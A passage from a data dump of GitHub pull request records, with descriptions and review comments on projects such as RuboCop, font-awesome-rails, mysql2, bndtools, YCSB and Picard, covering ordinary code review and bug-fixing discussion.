offenses.\r\n\r\nIt would be interesting to explore the false offenses in more detail to see what we can do: should I just run the cop against the Rubocop codebase itself to see the `lambda` and `Brenchmark.realtime` issues you speak of? I\'d expect `realtime` to work correctly (as it is procedural).\r\n', 'How well can we approximate @jimweirich\xe2\x80\x99s \xe2\x80\x9csemantic rule\xe2\x80\x9d (for a block) with a set of syntactic rules (for a method that takes a block)? In general the answer is: not very, because _in extremis_ the method may not yield to the block at all, in which case there is literally no connection between the block\xe2\x80\x99s behaviour and the method\xe2\x80\x99s, and it\xe2\x80\x99s impractical to get into analysing the method itself to discover what the connection actually is.\r\n\r\nHowever, I believe @mudge\xe2\x80\x99s heuristic \xe2\x80\x94 \xe2\x80\x9cassume that the block\xe2\x80\x99s return value is used _iff_ the method\xe2\x80\x99s return value is used\xe2\x80\x9d \xe2\x80\x94 is a decent one for most practical situations. That\xe2\x80\x99s because there is a real and non-coincidental relationship between the procedural-or-functional nature of the block and the nature of the method which yields to it: if the main purpose of the block is to have side-effects, it is a bit more likely that the method itself does a job that is parameterised over different side-effects, which in turn makes it a bit more likely that the work of the method is observed mainly through its side-effects rather than through its return value. And conversely, if the block is mainly functional, it\xe2\x80\x99s more likely that the method is parameterised over pure functions, so it\xe2\x80\x99s more likely that the method itself is functional and produces a meaningful return value.\r\n\r\nSo, for example, we don\xe2\x80\x99t need a catalogue of the nature of `Enumerable`\xe2\x80\x99s methods, because it is usually fine to infer them from usage. In practice, people typically discard the return value of `#each`/`#each_with_index`/`#each_with_object`, because the whole point of those methods is to have side-effects, and the reason they take a block is to customise those side-effects; so, when we see that the method\xe2\x80\x99s return value is uninteresting, it is reasonable to assume that the associated block is procedural. And likewise, people typically *don\xe2\x80\x99t* discard the return value of `#map` (unless they\xe2\x80\x99re using it wrong!) because the whole point of it is to compute a pure function, with the block argument specifying exactly which pure function to compute; so, when we see people storing the result of a `#map`, it makes sense to assume that the result of its block was useful too.\r\n\r\n(In a case like `#inject` it can go either way, because sometimes people use intermediate side effects as a way of computing the block\xe2\x80\x99s final value, although this is arguably covered by @jimweirich\xe2\x80\x99s \xe2\x80\x9c[the primary purpose of the block](https://github.com/bbatsov/ruby-style-guide/issues/162#issue-13134473)\xe2\x80\x9d phrasing. Methods like `Object#tap` are an exception, pure and simple, because they have the unusual purpose of hiding the side-effects of their block.)\r\n\r\nThe heuristic is still a gross approximation but I think that it makes probabilistic sense \xe2\x80\x94 in the general case it is more likely to be right than wrong. Whitelisting can deal with the legitimate exceptions to the rule, but we can expect there to be fewer exceptional cases than conformant ones.\r\n\r\nPragmatically, therefore, the proposed behaviour would be an improvement over the status quo, which is that people who like intention-revealing `do`\xe2\x80\xa6`end`/`{`\xe2\x80\xa6`}` just disable the `Blocks` cop entirely. This change would allow them to leave the cop enabled, and only occasionally require them to do some gardening to teach it about `RSpec::Core::ExampleGroup.let` or `ActiveRecord::Base.create` or whatever. ', ':+1: ', ""@mudge and @tomstuart Thanks for clarifying! I think we're all on the same page, more or less. We might have slightly different ideas (guesses) about which set of heuristics will give the best approximation of the Weirich rule.\r\n\r\nSo as far as I'm concerned, I think you can continue on the same track, looking mainly on how the method's return value is used. Let's see where it leads.\r\n\r\n@mudge Setting `EnforcesStyle` to `weirich` and running `rubocop` on RuboCop's own code base, then trying to minimize the number of false positives is a good idea!"", 'After looking at the offences reported, it might be worth splitting the single `whitelist` into three groups:\r\n\r\n1. Methods that are known to be ""functional"" regardless of usage (e.g. `RSpec::Core::ExampleGroup.let`);\r\n2. Methods that are known to be ""procedural"" regardless of usage (e.g. `tap`, `ActiveRecord::Base#create`, `Benchmark.realtime`, `each_with_object`);\r\n3. Methods that cannot be categorised from usage alone.\r\n\r\nThe Rubocop codebase shows that `lambda` is definitely in group 3 here so we should skip checking it as there\'s no practical way to tell if the brace/`do`...`end` usage is correct. The rest of the offences are largely correct (e.g. `map`, `reduce`, `find`, `select`, `expect`).\r\n\r\nI\'ll see about adding this then we could encourage people to add methods to the appropriate lists as necessary (and hopefully this won\'t be a common occurrence as the heuristic should be good enough for most cases).', ""Updated to now have separate `FunctionalMethods`, `ProceduralMethods` and `IgnoredMethods`. I also relaxed the restriction so that the Weirich style runs against single-line blocks as well.\r\n\r\nRunning against the Rubocop codebase highlighted that we weren't catching blocks used in guard clauses such as `return if any? { |x| x.even? }` or `return unless any? { |x| x.even? } || foo` so added support for that too.\r\n\r\nFrom my own testing, the offences reported against Rubocop under the Weirich style now appear to be correct, e.g.\r\n\r\n* Use of `select`, `reject`, `partition`, `any?`, `map`, `expect` with `do`..`end`;\r\n* Use of `each`, `before`, `after`, `reduce`, `sort!`, `map!`, `reject!` with `{`..`}`."", ':+1: Just had one small comment. Looks good otherwise! I like the three lists in configuration.', '@jonas054 thanks, just updated to remove the redundant `Array()`.', '@bbatsov updated with new style names: `line_count_based` and `semantic`. I went with `count` rather than `length` as `line_length` could be mistakenly interpreted as ""number of characters in a line"".\r\n\r\nA second commit then renames the `Blocks` cop to the more descriptive `BlocksDelimiter` cop (along with associated renaming elsewhere in the code).', 'Nice job @mudge.', 'Thanks @mudge, much appreciated!']"
159,bbatsov/rubocop,1831.0,"This fixes #1136.

I have been working on this cop for quite some time, and I think that I finally have all the kinks worked out. It will only register an offense when the number of variables being assigned to matches the number of assigning variables. It will also allow you to perform variable reassignment (`a, b = b, a`). Any assignment using splat or a method is also allowed.

I think that this will be able to detect a large number of offenses while allowing parallel assignment where you would want to use it. 

Please look over it and let me know if you have any concerns with this cop.","['I had commented on this code earlier, but when I rebased it, the comments went away.', 'I have split the fixing of offenses into 2 commits.', 'Btw, see https://github.com/bbatsov/rubocop/pull/1833 as it makes some changes to the auto-correct API.', 'I have changed the number of allowed offenses for method length and module length.', '@jonas054, sorry about those bits of code that were not covered by tests. I originally was trying to make this cop be able to account for situations where the number of variables on the left and right side did not match. This was proving troublesome for detection and correction so I changed the cop to only complain when the variable count matches. I missed removing a couple of lines of code. I have removed those lines of codes, and I have made some small modifications to the code to account for edge cases that I had not thought of before.', 'Just one remark on the code, and the commit message should be ""Increase ..."" rather than ""Increasing ..."". Other than that, it looks fine now.', 'The code has been updated.', ':+1: ', ':+1: Happy to see this in RuboCop 0.31.0. In addition to making the code more readable, it also [makes it somewhat faster](https://github.com/JuanitoFatas/fast-ruby#parallel-assignment-vs-sequential-assignment-code).', '@sferik, thanks for the positive feedback.\r\n:+1: ']"
160,bbatsov/rubocop,228.0,"It checks whether you've nested too many if/while/etc. blocks
which increase the cyclomatic complexity.

@bbatsov this could be changed to only checked inside `def`s as you proposed, but I haven't done it, since I don't see a problem with doing the check at all levels?
Maybe you meant to do that if we were to count `do`/`end` blocks, too. Let me know if you prefer to do that.

I think it's a question of definition, i.e. whether this rule is meant to prevent syntactical nesting, or nesting that increases cyclomatic complexity.","['\n[![Coverage Status](https://coveralls.io/builds/59758/badge)](https://coveralls.io/builds/59758)\n\nCoverage remained the same when pulling **699b75a4a996b0aa26701dfb4c7f5beac9f52fff on emou:nesting-levels-cop** into **9627794c21ea27dc0b54437b7c42160e313b0f85 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/59761/badge)](https://coveralls.io/builds/59761)\n\nCoverage remained the same when pulling **7c16e8b035175c3fb26d9e36e2d4037d0c4d5519 on emou:nesting-levels-cop** into **9627794c21ea27dc0b54437b7c42160e313b0f85 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/59762/badge)](https://coveralls.io/builds/59762)\n\nCoverage remained the same when pulling **7c16e8b035175c3fb26d9e36e2d4037d0c4d5519 on emou:nesting-levels-cop** into **9627794c21ea27dc0b54437b7c42160e313b0f85 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/59763/badge)](https://coveralls.io/builds/59763)\n\nCoverage remained the same when pulling **b5dd9c7a0d69b37e18111640ec0d41a855d2f4a3 on emou:nesting-levels-cop** into **9627794c21ea27dc0b54437b7c42160e313b0f85 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/59766/badge)](https://coveralls.io/builds/59766)\n\nCoverage remained the same when pulling **ec84e29607943ea526dae1d614044fc93d604919 on emou:nesting-levels-cop** into **9627794c21ea27dc0b54437b7c42160e313b0f85 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/59781/badge)](https://coveralls.io/builds/59781)\n\nCoverage remained the same when pulling **fb0bd047e7e50ad08787438b078ffec2591747f7 on emou:nesting-levels-cop** into **9627794c21ea27dc0b54437b7c42160e313b0f85 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/59782/badge)](https://coveralls.io/builds/59782)\n\nCoverage remained the same when pulling **cdf66d524ec80b1d4e20fa6bfeae306e25c80acc on emou:nesting-levels-cop** into **9627794c21ea27dc0b54437b7c42160e313b0f85 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/59784/badge)](https://coveralls.io/builds/59784)\n\nCoverage remained the same when pulling **6348c665f20d729f0275b265102bf5e15b3c31bd on emou:nesting-levels-cop** into **9627794c21ea27dc0b54437b7c42160e313b0f85 on bbatsov:master**.\n', ""Yep, I meant if we counted blocks as nesting checking only `defs` might make sense. But I actually like your solution better as it is. Since blocks are not conditionals I don't feel they're as evil :-) Good work!"", ""@bbatsov thanks, and sorry for triggering the `coveralls` spam :) I tend to push as I fix things and didn't know it will trigger every time I do that.""]"
161,bensie/sshkey,10.0,"I've found it useful to pull out public SSH Key bits.  To that end, I broke out the logic of `::valid_ssh_public_key?` into a private method and use that data for both validation and `::ssh_public_key_bits`.  In both cases, if a key is invalid, false is returned.

The compressed syntax on line [#62](#L0R62) can be off-putting to some.  If it's a problem, I'll break it out onto two lines and rebase.

I did run the build through Travis, but I'm an error against [ruby-head](https://travis-ci.org/dacamp/sshkey/jobs/11004091).  Seems like it's a [known issue](https://github.com/travis-ci/travis-ci/issues/1195) though.  Might not be a bad idea to configure ruby-head as an allowable failure.

If you think this addition is useful, please review it and let me know if you have any questions.  Thanks!","[""Nice work! \r\n\r\nNot too long ago I added [SSHKey#bits](https://github.com/bensie/sshkey/blob/master/lib/sshkey.rb#L195) but it just yanks the bits out of the private key file as written. Not too keen on figuring out the bit value two different ways in the same lib, but obviously we can't just look at the private key when you're checking against the public key.\r\n\r\nSo, do you think your method of getting the bits from the public key should be the way to go when we have an `SSHKey` object, and therefore have the private key? Pulling the bits straight from the text is definitely simpler, but since we can calculate the bits from the public key, that may be better overall.\r\n\r\nI have a few comments on your code as well, but will note them on each line.\r\n\r\nDon't worry about the ruby-head error, I'll merge your PR to allow failures on it."", 'Again, awesome work. Thanks a lot!', ""No problem! :thumbsup:\r\n\r\nWhen you get a chance, I'd appreciate a push to Rubygems. I'll be thankful to just include SSHKey in my Gemfile rather than storing it inside of config/initializers. :persevere:  Thanks!"", 'No problem, I\'ll likely push sometime this weekend. In the meantime, you can add this to your Gemfile:\r\n\r\n```ruby\r\ngem ""sshkey"", github: ""bensie/sshkey""\r\n```']"
162,bflad/chef-docker,20.0,"Hi,

I added the ability for the image LWRP to support `docker import` and also expanded the build action to support non-Dockerfile image builds.

README has been updated to include examples for the new functionality.

Thanks!","['@bflad Updated with the two changes', 'Perfect. Going to merge and cut a release. Thanks!']"
163,bkeepers/dotenv,83.0,"1. Added Ruby 2.1.0, Rubinius, JRuby to Travis config.
2. Updated deprecated syntax in specs to match the other specs.
3. Added Rubinius gems to Gemfile.

JRuby and Rubinius have allowed failures because they don't support the embedded shell behavior that is available on MRI VMs.",[':heart: thanks!']
164,bndtools/bnd,880.0,"This code was developed by Paremus Ltd on behalf of a customer. That customer has instructed us to contribute the code to the bnd project under the terms of the Apache License V2.

The customer is a large, well known company and we hope to confirm their identity in due course.

Signed-off-by: Neil Bartlett <neil.bartlett@paremus.com>",[]
165,bndtools/bndtools,999.0,"Handles the case where:
Java Project A outputs a.jar containing package A
OSGI Project B has a version=file reference to a.jar and includes package A in export-packages.
OSGI Project C has buildpath reference to B and uses something in package A.

Without this change, Project C couldn't build due to
""not accessible due to restriction on required project"" errors

Signed-off-by: Carter Smithhart <carter.smithhart@gmail.com>","['This allows me to close out #420', 'How does this match the offline build behavior? Does this improve the fidelity?', ""I just tweaked the implementation. I forget to verify that non-exported packages shouldn't be accessible. I just tested that with the tweak.\r\n\r\nI believe this brings bndtools closer to matching bnd. It definitely addresses (part of?) a problem with an eclipse project wrapping a .jar and providing portions of that jar as exported packages."", 'I tested another case:\r\nProject A uses jar file B with packace C\r\nProject A also overrides a class in package C\r\nProject A exports package C\r\nProject D has a buildpath reference to A.\r\nProject D does sees the updated class from Project A.\r\n\r\nThe only thing that didn\'t work as expected was that I had to do a ""rebuild"" on project A to get the classpath to get recalculated so that Project D saw the right version of package C. This happens if package C was just created in Project A.\r\n\r\nI think eclipse is providing the jar B package C instead of Project A package C. A rebuild cleared that up.\r\n\r\nI\'m sure there\'s a fix for to make it work right -- although I don\'t know if this is a likely case people will run into.\r\n\r\nThe basic problem is fixed with this pull request. There may be strange cases like this test right here that don\'t work ""perfectly""', ""Refactored and rebased.\r\n\r\nI ran into nastiness that slowed me down related to .gitattributes *.css and *.properties. I had to comment those 2 lines out. Otherwise everytime I did a git clean or git checkout, it would think I changed these two:\r\n\tmodified:   bndtools.core/resources/unprocessed/intro/css/whatsnew.css\r\n\tmodified:   bndtools.core/resources/unprocessed/intro/css/whatsnew.properties\r\n\r\nAlthough now that I set core.autocrlf=false, it seems to have gone away. ugg.\r\nI'm using git version 1.9.1 on ubuntu."", 'Did you by any chance also validate if this PR fixes #937 as it sounds related.', ""> I ran into nastiness that slowed me down related to .gitattributes *.css and *.properties. I had to comment those 2 lines out. Otherwise everytime I did a git clean or git checkout, it would think I changed these two:\r\n> modified: bndtools.core/resources/unprocessed/intro/css/whatsnew.css\r\n> modified: bndtools.core/resources/unprocessed/intro/css/whatsnew.properties\r\n> \r\n> Although now that I set core.autocrlf=false, it seems to have gone away. ugg.\r\n> I'm using git version 1.9.1 on ubuntu.\r\n\r\nI'll release a PR to fix this."", ""> I'll release a PR to fix this.\r\n\r\nThat issue is fixed by https://github.com/bndtools/bndtools/pull/1001."", ""I wonder if there's any good way to set up eclipse test projects for exercising weird stuff like this. hmm."", ""This last commit has a bit longer explanation for what this commit is now all about.\r\n\r\nI now actually believe this will increase the fidelity between bndtools and bnd in terms of no-transitive dependencies. I think there might be a fringe case or 2 left, but this should resolve some of the other outstanding issues related to access issues and version=file references.\r\n\r\nOutside of this issue, the NewBuilder doesn't seem to kick off a build when the classpath changes sometimes... and I don't know why. I traced through the NewBuilder code and it correctly updates the classpath, then returns a dependent project like it does elsewhere in the class. But a project rebuild is then required to get a project to build without errors. I have an example test case above in this issue if someone is interested."", 'Any concerns about merging this in? It should see some bake time in the baseline before another release.\r\n\r\nI know I have the power to merge it in myself, but I\'m not quite sure when a review must/should happen... What\'s our protocol?\r\n\r\nI suppose a ""bad"" change could always get reverted... but is that how we\'re working?', 'It is rather simple :-) \r\n\r\nIf you make a simple fix, merge it yourself. If it is in any way imaginable contentious (workspace layout for example :-), you feel unsure, or it is large then ping the group and ask for review. As you said, it is easy to undo.\r\n\r\nIn this case, go for it. Looks like you did some serious work in this black art part of bndtools ...', ""doh... I missed something. I'm either going to fix it or revert it."", ':-)']"
166,bokmann/font-awesome-rails,30.0,"This is something I've been considering for a while. I've been copying some font-awesome view helpers between some rails projects, but it'd be nice to have them consolidated. I've also been on a kick to consolidate the [competing](https://github.com/littlebtc/font-awesome-sass-rails) [font-awesome asset](https://github.com/balexand/font_awesome) [pipeline gems](https://github.com/kristianmandrup/font_awesome-sass-rails) and try to make this gem the canonical one (several others are outdated, rely on sass unnecessarily, etc). [One of the competing gems](https://github.com/kristianmandrup/font_awesome-sass-rails) had some helpers, which rekindled the idea.

In trying to formalize this proposal, I was thinking of two new helper methods, `fa_icon` and `fa_stacked_icon`. Before I dive into an implementation, I wanted to present some method signature examples and start a discussion.

```ruby
# <i class=""icon-camera-retro""></i>
fa_icon ""camera-retro""                                           

# <i class=""icon-camera-retro""></i> Take a photo
fa_icon ""camera-retro"", text: ""Take a photo""

# <i class=""icon-camera-retro icon-large""></i>
fa_icon ""camera-retro large""
# <i class=""icon-camera-retro icon-2x""></i>
fa_icon ""camera-retro 2x""
# <i class=""icon-camera-retro icon-3x""></i>
fa_icon ""camera-retro 3x""
# <i class=""icon-camera-retro icon-4x""></i>
fa_icon [""camera-retro"", ""4x""]

# <i class=""icon-quote-left icon-4x icon-muted pull-left""></i>
fa_icon ""quote-left 4x muted"", class: ""pull-left""
# <i class=""icon-flag icon-4x icon-border pull-left""></i>
fa_icon ""flag 4x border"", class: ""pull-left""

# <i class=""icon-refresh icon-spin""></i>
fa_icon ""refresh spin""
fa_icon [""refresh"", ""spin""]

# <i class=""icon-spinner icon-spin icon-large"">
fa_icon ""spinner spin large""

# <i class=""icon-fixed-width icon-pencil"">
fa_icon ""pencil fixed-width""

# <li><i class=""icon-li icon-ok""></i> Bulleted list item</li>
content_tag(:li, fa_icon(""ok li"", text: ""Bulleted list item""))

# <i class=""icon-shield icon-rotate-180"">
fa_icon ""shield rotate-180""
# <i class=""icon-shield icon-flip-vertical""></i>
fa_icon ""shield flip-vertical""

# <span class=""icon-stack"">
#   <i class=""icon-check-empty icon-stack-base""></i>
#   <i class=""icon-twitter""></i>
# </span>
fa_stacked_icon ""check-empty"", ""twitter""

# <span class=""icon-stack"">
#   <i class=""icon-sign-blank icon-stack-base""></i>
#   <i class=""icon-terminal icon-light""></i>
# </span>
fa_stacked_icon ""sign-blank"", ""terminal light""
```

**Update:** `fa_stacked_icon` signature changed. It's now:

```ruby
# <span class=""icon-stack"">
#   <i class=""icon-check-empty icon-stack-base""></i>
#   <i class=""icon-twitter""></i>
# </span>
fa_stacked_icon ""twitter"", base: ""check-empty""
```","['As a first pass at helpers available in erb (or haml), I like it.  I\'ve been considering refactoring stuff to scss mixins, so I could do stuff like this (the other includes are from susy or compass, and are for illustrative purposes):\r\n\r\n```scss\r\n.home-panel {\r\n  @include font-awesome-icon(""home"");\r\n  @include span-columns(4);\r\n  @include nth-omega(3n);\r\n  @include border-radius(6px);\r\n}\r\n```\r\n\r\nexactly what that would emit I\'m not sure yet, whether it would make it a background, or a pseudo &:before, whether there\'d be other mixins or parameters for things like large, rotated, etc...  I haven\'t actually thought about it enough to have the hard-won opinions I want to have before I do it, but my goal would be to keep any of the html referencing the font-awesome css directly.\r\n', ""Roger that. I'll see if I can start to play with a branch this week that incorporates the helpers.\r\n\r\nFor mixins, I can definitely see the appeal, but I think things became slightly more involved since FontAwesome decommissioned core Sass/SCSS support. It might also be somewhat of a hassle to keep parity with FontAwesome as it changes. If it were to happen though, it should be auto-generated from the core [icons.yml](https://github.com/FortAwesome/Font-Awesome/blob/master/build/icons.yml). Also, here are some related ideas that were rejected by FontAwesome:\r\nhttps://github.com/FortAwesome/Font-Awesome/pull/638\r\nhttps://github.com/FortAwesome/Font-Awesome/issues/432"", ""This should be code complete for now, but I'm going to let the Travis build work itself out and I'm also going to sleep on this to make sure I don't dream up any blockers or other ideas before I merge this in.\r\n\r\nReviews welcome.\r\n\r\n_**Note:** After writing this, I fell out of love with the `fa_icon` naming, but I couldn't come up with something better (and terse enough) that wouldn't potentially have naming conflicts in people's projects (e.g. `icon` and `stacked_icon` might conflict). I did have an idea to optionally alias these methods (e.g. `icon` -> `fa_icon`) with a special include, but I'm not sure the added complexity is worth it. Suggestions and feedback welcome._"", ""How about `iconic`? From FA's website:\r\n\r\n> Font Awesome\r\n> The iconic font designed for Bootstrap"", ""@whatasunnyday I really like the sentiment, but I'm hesitant to use `iconic` because it represents an adjective instead of a noun.\r\n\r\n@bokmann @balexand Let me know if you see any stoppers with this current implementation. I'll be able to use these helpers immediately on at least 3 projects. I had 3 somewhat similar but more involved implementations that evolved into what is now part of this pull-request. I'd really like to replace those implementations with these shared helpers.\r\n\r\nTwo things that I'm still waffling over.\r\n\r\n1. The helper method names as discussed above.\r\n2. Should including this gem autoload the helpers? Right now, it requires an explicit include in your ApplicationController to pull them in, but I could very easily argue the alternative of automatically including these helpers in the views. If it were a vote, I'd vote for the automatic inclusion, but I started with the less intrusive option to start the discussion."", ""I think the fa_ convention is reasonable - I don't think I'm going to *love* anything, and this at least is mnemonic enough to trigger the proper association.\r\n\r\nLets do the automatic inclusion.  I'd prefer to make it as brain-dead simple to use. For the record Ryan, I think your opinion on these matters hold the most weight - While I still have this gem in use on a few projects, I'm not *active* on any one of them for the time being (I'm off in clojure-land for the next few months)."", 'I just realized that the `fa_stacked_icon` signature should be adjusted to support reverse stacked icons. \r\n\r\n**For example:** \r\n![font awesome examples](https://f.cloud.github.com/assets/740/913218/3e1a61d8-fe12-11e2-88cd-8982bd8646b8.jpg)\r\n\r\n\r\n```html\r\n<span class=""icon-stack"">\r\n  <i class=""icon-camera""></i>\r\n  <i class=""icon-ban-circle icon-stack-base""></i>\r\n</span>\r\n```\r\n\r\nSo, instead of `fa_stacked_icon` taking the base first and the main icon second, maybe it should take the main icon first and take the base as an option. This would probably help with the readability too. Of course, there\'s also the notion of reversing the stack.\r\n\r\n```ruby\r\nfa_stacked_icon ""camera"", base: ""ban-circle"", reverse: true\r\n```\r\n', ""I made several changes based on our previous discussion here and merged everything into the master branch. I'm going to test some things in more detail hopefully this week. After I've got everything confirmed as working on real-world applications, I'll bump the version and release a new gem."", ""Thanks for everyone's help on this. The helpers are now part of font-awesome-rails v3.2.1.3""]"
167,brianfrankcooper/YCSB,292.0,"http://tarantool.org and https://github.com/tarantool/tarantool
In ""mail.ru"" we wrote and widely use Tarantool key-value database.
It's key properties include:

* Defferent index types with iterators:
    - HASH (the fastest)
    - TREE (range and ordered retreival)
    - BITSET (bit mask search)
    - RTREE (geo search)
* multipart keys for HASH and TREE indexes
* Data persistence with by Write Ahead Log (WAL) and snapshots.
* asynchronous master-master replication, hot standby.
* coroutines and async. IO are used to implement high-performance lock-free access to data.
    - socket-io/file-io with yeilds from lua
* stored procedures in Lua (Using LuaJIT)
* supports plugins written on C/C++ (Have two basic plugins for working with MySQL and PostgreSQL)
* Authentication and access control

Move 'distribution target' to the end (it's needed for .jar to be in the .tar.gz)","[""@busbey i've rebased and pushed latest version. Tell me about everything that i must fix. Thanks."", ""Okay, i've fixed all."", ""I just noticed the lua scripts are in `tarantool/config/`. Since users need to install them in their Tarantool cluster, they'll need to be in the binary artifact. To get included there, they need to be in `tarantool/src/main/conf`.\r\n\r\nI'm fine with this being done either as a follow-on or as another change here. Just let me know which you prefer."", ""I've pushed commit, that moves configuration files."", ""@busbey, yes, i'm sorry. It's late night here and i'm sleepy:) I've fixed it."", 'Thanks for the contribution!']"
168,brianmario/mysql2,634.0,See #633.,"[""Thank you for debugging this!\r\nEdit: oh my, it's compiling mysql 5.5 on the OSX VM."", ""Whoa, hilarious. I've added a `brew update` which should hopefully include the bottle."", 'Infinite loop of ""checking for mysql_query() in -lmysqlclient... no"" -- interesting failure in this block in extconf.rb\r\n``` ruby\r\n  while not find_library(\'mysqlclient\', \'mysql_query\', lib, ""#{lib}/mysql"") do\r\n     exit 1 if libs.empty?\r\n     found ||= have_library(libs.shift)\r\n   end\r\n```\r\nhttps://travis-ci.org/brianmario/mysql2/jobs/66233625""', 'I think I fixed that. Fingers crossed.', 'Huzzah, this now repros in CI.', ""Well isn't that a thing. Smells like a MySQL bug."", ""Yeah, that's pretty unfortunate. I'd like to dig into it more but don't really know where to begin. Any guidance? Also cool if you want to take it on.\r\n\r\nSuper strange that it's OSX only."", ""So far I haven't found anything obvious, searching here: http://bugs.mysql.com/search.php"", 'OK, so this is interesting. This is a bug in libmysqlclient, not the running mysql server. I compiled mysql2 against 5.5 and then ran the test suite against a running 5.6 and **was** able to repro.', 'Further confirmed: compiling against 5.6 and running against 5.5 does **not** repro.', 'Looks like the problem is in `mysql_read_query_result`. Digging.', 'http://bugs.mysql.com/bug.php?id=65956\r\nTHIS -> http://bugs.mysql.com/bug.php?id=62578', ""Oh that's very interesting. http://bugs.mysql.com/bug.php?id=62578 claims that percona-server fixed it in 5.5. Gonna test it."", 'Nope, still broken with percona-server 5.5.41-37.0', 'I wonder what would happen if I compiled mysql with `-DTHREAD_SAFE_CLIENT`...', 'Since we\'ve got it narrowed down to MySQL 5.5 client, I\'m comfortable making those tests pending:\r\n``` ruby\r\n  pending(""libmysqlclient 5.5 does not reconnect after interrupt, see http://bugs.mysql.com/bug.php?id=62578"") if Mysql::Client.info[:version] =~ /^5\\.5/\r\n```', ""Cool, I'll make that change shortly."", ""Actually it still bothers me that this doesn't repo on linux. Any thoughts on that?"", ""Also, neither of those mysql bugs are reproducible on my machine, so I don't think that's what we're seeing here."", ""Alright, I've whitelisted the tests, this should be good to merge."", 'Bogus failures =/', '@sodabrew ready to merge this?', ""Narrowed down to just OS X? Ok, I suppose since the CI's MySQL 5.5-ubuntu package isn't exhibiting the problem."", ""Yep, the beauty of `pending` is that it asserts that the test definitely fails - given that we're green on Travis' ubuntu, this is an OSX thing.""]"
169,broadinstitute/picard,221.0,"Changed CollectGcBiasMetrics to work as a multilevel collector.

Added test - Fixed test to create its own temporary sam file from chrM for testing","['All set.  Mostly stylistic and protection level comments.  And the probably unnecessary change of adding referenceFile to SinglePassSamProgram.setup.  Once corrected then :+1: ', 'Kylee, make sure that you are aware of the next ""picard release"" and that\nyou see that the gc metrics are produced as are all the other metrics etc.\n\nOn Tue, Jun 9, 2015 at 3:02 PM, kbergin <notifications@github.com> wrote:\n\n> Merged #221 <https://github.com/broadinstitute/picard/pull/221>.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/broadinstitute/picard/pull/221#event-326649526>.\n>\n', 'Ok, who should I talk to about that- I saw your hip chat about picard private breaking :( what broke and how do I fix it?\n\n\n\n> On Jun 9, 2015, at 4:13 PM, Yossi Farjoun <notifications@github.com> wrote:\n> \n> Kylee, make sure that you are aware of the next ""picard release"" and that\n> you see that the gc metrics are produced as are all the other metrics etc.\n> \n> On Tue, Jun 9, 2015 at 3:02 PM, kbergin <notifications@github.com> wrote:\n> \n> > Merged #221 <https://github.com/broadinstitute/picard/pull/221>.\n> >\n> > \xe2\x80\x94\n> > Reply to this email directly or view it on GitHub\n> > <https://github.com/broadinstitute/picard/pull/221#event-326649526>.\n> >\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub.\n> \n', 'Can you follow the link?\nhttp://prodinfobuild.broadinstitute.org:8085/browse/PICARD-TRUNK-3823\nIt shows that the breakage happens when some test tries inserting your new\nmetric files into the database.\n\nI think it\'s going to be a bit difficult to figure it out on your own. I\nrecommend asking Matt Sooknah or Miguel since the problem is that the\ndatabase is missing the ""ACCUMULATION_LEVEL"" field, which is now added\nsince you are collecting using the multi-level collector.\n\nDoes this make sense?\n\nYossi.\n\nOn Tue, Jun 9, 2015 at 4:51 PM, kbergin <notifications@github.com> wrote:\n\n> Ok, who should I talk to about that- I saw your hip chat about picard\n> private breaking :( what broke and how do I fix it?\n>\n>\n>\n> > On Jun 9, 2015, at 4:13 PM, Yossi Farjoun <notifications@github.com>\n> wrote:\n> >\n> > Kylee, make sure that you are aware of the next ""picard release"" and that\n> > you see that the gc metrics are produced as are all the other metrics\n> etc.\n> >\n> > On Tue, Jun 9, 2015 at 3:02 PM, kbergin <notifications@github.com>\n> wrote:\n> >\n> > > Merged #221 <https://github.com/broadinstitute/picard/pull/221>.\n> > >\n> > > \xe2\x80\x94\n> > > Reply to this email directly or view it on GitHub\n> > > <https://github.com/broadinstitute/picard/pull/221#event-326649526>.\n>\n> > >\n> > \xe2\x80\x94\n> > Reply to this email directly or view it on GitHub.\n> >\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/broadinstitute/picard/pull/221#issuecomment-110500760>\n> .\n>\n', 'Oh that makes sense. Yes I will need help, who volunteers as tribute? :P\n\nThanks!\n\n\n\n> On Jun 9, 2015, at 5:40 PM, Yossi Farjoun <notifications@github.com> wrote:\n> \n> Can you follow the link?\n> http://prodinfobuild.broadinstitute.org:8085/browse/PICARD-TRUNK-3823\n> It shows that the breakage happens when some test tries inserting your new\n> metric files into the database.\n> \n> I think it\'s going to be a bit difficult to figure it out on your own. I\n> recommend asking Matt Sooknah or Miguel since the problem is that the\n> database is missing the ""ACCUMULATION_LEVEL"" field, which is now added\n> since you are collecting using the multi-level collector.\n> \n> Does this make sense?\n> \n> Yossi.\n> \n> On Tue, Jun 9, 2015 at 4:51 PM, kbergin <notifications@github.com> wrote:\n> \n> > Ok, who should I talk to about that- I saw your hip chat about picard\n> > private breaking :( what broke and how do I fix it?\n> >\n> >\n> >\n> > > On Jun 9, 2015, at 4:13 PM, Yossi Farjoun <notifications@github.com>\n> > wrote:\n> > >\n> > > Kylee, make sure that you are aware of the next ""picard release"" and that\n> > > you see that the gc metrics are produced as are all the other metrics\n> > etc.\n> > >\n> > > On Tue, Jun 9, 2015 at 3:02 PM, kbergin <notifications@github.com>\n> > wrote:\n> > >\n> > > > Merged #221 <https://github.com/broadinstitute/picard/pull/221>.\n> > > >\n> > > > \xe2\x80\x94\n> > > > Reply to this email directly or view it on GitHub\n> > > > <https://github.com/broadinstitute/picard/pull/221#event-326649526>.\n> >\n> > > >\n> > > \xe2\x80\x94\n> > > Reply to this email directly or view it on GitHub.\n> > >\n> >\n> > \xe2\x80\x94\n> > Reply to this email directly or view it on GitHub\n> > <https://github.com/broadinstitute/picard/pull/221#issuecomment-110500760>\n> > .\n> >\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub.\n> \n', 'I\'m sure the former picard team will be happy to assist.\n\nY.\n\nOn Tue, Jun 9, 2015 at 6:36 PM, kbergin <notifications@github.com> 